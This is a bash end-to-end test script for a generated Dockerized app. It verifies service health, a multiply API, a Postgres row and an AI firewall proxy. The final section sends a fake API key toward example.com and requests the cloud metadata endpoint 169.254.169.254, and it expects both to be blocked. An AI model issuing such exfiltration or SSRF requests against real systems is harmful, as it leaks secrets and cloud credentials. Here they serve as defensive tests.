#!/usr/bin/env bash
# Usage: tests/container-e2e.sh <generated-project-dir> <frontend-port>
# Verifies a generated project end-to-end inside Docker: services healthy,
# multiply API responds correctly, and the result was persisted in Postgres.
set -euo pipefail
cd "$1"
FRONTEND_PORT="${2:-3000}"
echo "==> Services"
docker compose ps

echo "==> Waiting for frontend reachable on :$FRONTEND_PORT..."
for i in $(seq 1 30); do
  if curl -fsS -o /dev/null "http://127.0.0.1:$FRONTEND_PORT" 2>/dev/null; then
    echo "Frontend reachable!"
    break
  fi
  sleep 2
done

echo "==> Waiting for backend API reachable on :8000..."
for i in $(seq 1 30); do
  if curl -fsS -o /dev/null "http://127.0.0.1:8000" 2>/dev/null || curl -fsS -o /dev/null "http://127.0.0.1:8000/docs" 2>/dev/null; then
    echo "Backend reachable!"
    break
  fi
  sleep 2
done

NUMBER=$(( (RANDOM % 900) + 100 ))
EXPECTED=$(( NUMBER * 2 ))
echo "==> POST /api/multiply number=$NUMBER (expect $EXPECTED)"
RESPONSE=""
for i in $(seq 1 15); do
  if RESPONSE=$(curl -fsS -X POST http://127.0.0.1:8000/api/multiply \
    -H 'Content-Type: application/json' -d "{\"number\": $NUMBER}" 2>/dev/null); then
    break
  fi
  sleep 2
done
echo "$RESPONSE"
echo "$RESPONSE" | grep -Eq "\"result\": *$EXPECTED(\.0)?[,}]" \
  || { echo "Unexpected API response"; exit 1; }

echo "==> Verifying row in Postgres"
ROWS=$(docker compose exec -T db psql -U user -d appdb -tA \
  -c "SELECT count(*) FROM calculations WHERE input_number = $NUMBER AND result = $EXPECTED")
[ "$(echo "$ROWS" | tr -d '[:space:]')" -ge 1 ] \
  || { echo "No matching row found in calculations table"; exit 1; }

echo "==> Verifying Pipelock AI Firewall on :8888"
PIPELOCK_HEALTH=""
for i in $(seq 1 15); do
  if PIPELOCK_HEALTH=$(curl -fsS http://127.0.0.1:8888/health 2>/dev/null); then
    break
  fi
  sleep 2
done
echo "$PIPELOCK_HEALTH"
echo "$PIPELOCK_HEALTH" | grep -q '"status":"healthy"' \
  || { echo "Pipelock health check failed"; exit 1; }
echo "$PIPELOCK_HEALTH" | grep -q '"dlp_patterns":' \
  || { echo "Pipelock DLP patterns missing from health response"; exit 1; }

assert_pipelock_blocked() {
  local description="$1"
  local expected_text="$2"
  shift 2

  echo "==> Pipelock check: $description"
  local output status body
  output=$(curl -sS -w $'\n%{http_code}' "$@")
  status="${output##*$'\n'}"
  body="${output%$'\n'*}"
  echo "HTTP $status: $body"

  [ "$status" = "403" ] \
    || { echo "Expected HTTP 403 for $description, got $status"; exit 1; }
  echo "$body" | grep -q "$expected_text" \
    || { echo "Expected '$expected_text' in response for $description"; exit 1; }
}

FAKE_SECRET="sk-ant-api03-1234567890abcdefghij1234567890"
assert_pipelock_blocked \
  "Secret leak via fetch proxy" \
  "DLP match" \
  "http://127.0.0.1:8888/fetch?url=https://example.com/?key=${FAKE_SECRET}"

assert_pipelock_blocked \
  "Secret leak via forward proxy" \
  "DLP match" \
  -x http://127.0.0.1:8888 \
  "http://example.com/?key=${FAKE_SECRET}"

assert_pipelock_blocked \
  "SSRF to cloud metadata" \
  "SSRF blocked" \
  "http://127.0.0.1:8888/fetch?url=http://169.254.169.254/latest/meta-data/"

echo "✅ E2E OK"
